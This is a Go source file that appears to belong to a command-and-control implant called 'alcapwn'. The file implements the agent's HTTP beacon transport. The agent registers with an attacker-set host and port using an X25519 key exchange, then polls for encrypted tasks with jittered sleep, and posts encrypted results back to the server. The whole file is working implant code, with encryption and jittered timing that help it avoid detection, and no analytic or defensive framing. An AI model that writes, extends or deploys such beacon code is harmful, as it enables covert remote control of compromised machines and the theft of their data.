package main

import (
	"bytes"
	"crypto/ecdh"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"

	"alcapwn/proto"
)

// HTTPTransport implements Transport using HTTP beacon polling.
//
// Session lifecycle per reconnect cycle:
//
//  1. Connect — POST {baseURL}/register
//     Request:  [32-byte agent ephemeral X25519 pubkey][JSON proto.Hello]
//     Response: [32-byte server X25519 pubkey][encrypted proto.Welcome frame]
//     Derives CryptoSession; stores beacon token from Welcome.Token.
//
//  2. PollTask — GET {baseURL}/beacon/{token}
//     200: encrypted proto.Task frame in body
//     204: no task pending → sleep interval±jitter and retry
//
//  3. SendResult — POST {baseURL}/beacon/{token}
//     Body: encrypted proto.Result frame
type HTTPTransport struct {
	baseURL string
	fp      string // pinned server fingerprint (may be "")
	cs      *proto.CryptoSession
	token   string
	client  *http.Client
	ivSec   int
	jitPct  int
}

func newHTTPTransport(ivSec, jitPct int) *HTTPTransport {
	return &HTTPTransport{
		baseURL: fmt.Sprintf("http://%s:%s", lhost, lport),
		fp:      serverFingerprint,
		client:  &http.Client{Timeout: 30 * time.Second},
		ivSec:   ivSec,
		jitPct:  jitPct,
	}
}

// Connect registers with the server via POST /register.
// A fresh ephemeral X25519 key is generated for each session.
func (t *HTTPTransport) Connect(hello proto.Hello) error {
	agentPriv, err := ecdh.X25519().GenerateKey(rand.Reader)
	if err != nil {
		return fmt.Errorf("keygen: %w", err)
	}

	helloJSON, err := json.Marshal(hello)
	if err != nil {
		return fmt.Errorf("marshal hello: %w", err)
	}

	// Body: [32-byte pubkey][JSON Hello]
	body := append(agentPriv.PublicKey().Bytes(), helloJSON...)
	resp, err := t.client.Post(t.baseURL+"/register", "application/octet-stream", bytes.NewReader(body))
	if err != nil {
		return fmt.Errorf("register: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("register: server returned %s", resp.Status)
	}

	respBody, err := io.ReadAll(io.LimitReader(resp.Body, 32+int64(proto.MaxBodySize)+4))
	if err != nil {
		return fmt.Errorf("register: read response: %w", err)
	}
	if len(respBody) < 32 {
		return fmt.Errorf("register: response too short (%d bytes)", len(respBody))
	}

	serverPubBytes := respBody[:32]
	welcomeFrame := respBody[32:]

	cs, err := proto.NewClientCryptoSessionHTTP(agentPriv, serverPubBytes, t.fp)
	if err != nil {
		return fmt.Errorf("crypto: %w", err)
	}
	t.cs = cs

	env, err := proto.ReadMsgEncrypted(bytes.NewReader(welcomeFrame), cs)
	if err != nil {
		return fmt.Errorf("welcome decrypt: %w", err)
	}
	if env.Type != proto.MsgWelcome {
		return fmt.Errorf("expected welcome, got %s", env.Type)
	}
	var welcome proto.Welcome
	if err := json.Unmarshal(env.Data, &welcome); err != nil {
		return fmt.Errorf("welcome decode: %w", err)
	}
	if welcome.Token == "" {
		return fmt.Errorf("server did not provide a beacon token")
	}

	t.token = welcome.Token
	// Use server-suggested timing if provided.
	if welcome.Interval > 0 {
		t.ivSec = welcome.Interval
	}
	if welcome.Jitter >= 0 && welcome.Jitter <= 100 {
		t.jitPct = welcome.Jitter
	}
	return nil
}

// PollTask polls GET /beacon/{token} until a task arrives.
// 204 responses cause a jittered sleep before the next poll.
func (t *HTTPTransport) PollTask() (*proto.Task, error) {
	url := fmt.Sprintf("%s/beacon/%s", t.baseURL, t.token)
	for {
		resp, err := t.client.Get(url)
		if err != nil {
			return nil, fmt.Errorf("poll: %w", err)
		}

		switch resp.StatusCode {
		case http.StatusNoContent: // 204 — no task; sleep and retry
			resp.Body.Close()
			jitteredSleep(t.ivSec, t.jitPct)
			continue

		case http.StatusOK: // 200 — task available
			body, err := io.ReadAll(io.LimitReader(resp.Body, int64(proto.MaxBodySize)+4))
			resp.Body.Close()
			if err != nil {
				return nil, fmt.Errorf("poll: read body: %w", err)
			}
			env, err := proto.ReadMsgEncrypted(bytes.NewReader(body), t.cs)
			if err != nil {
				return nil, fmt.Errorf("poll: decrypt: %w", err)
			}
			if env.Type != proto.MsgTask {
				return nil, fmt.Errorf("poll: expected task, got %s", env.Type)
			}
			var task proto.Task
			if err := json.Unmarshal(env.Data, &task); err != nil {
				return nil, fmt.Errorf("poll: decode task: %w", err)
			}
			return &task, nil

		default:
			resp.Body.Close()
			return nil, fmt.Errorf("poll: unexpected status %s", resp.Status)
		}
	}
}

// SendResult POSTs an encrypted proto.Result to /beacon/{token}.
func (t *HTTPTransport) SendResult(result proto.Result) error {
	var buf bytes.Buffer
	if err := proto.WriteMsgEncrypted(&buf, t.cs, proto.MsgResult, result); err != nil {
		return fmt.Errorf("result encrypt: %w", err)
	}
	resp, err := t.client.Post(
		fmt.Sprintf("%s/beacon/%s", t.baseURL, t.token),
		"application/octet-stream",
		&buf,
	)
	if err != nil {
		return fmt.Errorf("result post: %w", err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("result post: server returned %s", resp.Status)
	}
	return nil
}

// Close is a no-op for HTTP transport; each request is independently dialed.
func (t *HTTPTransport) Close() {}
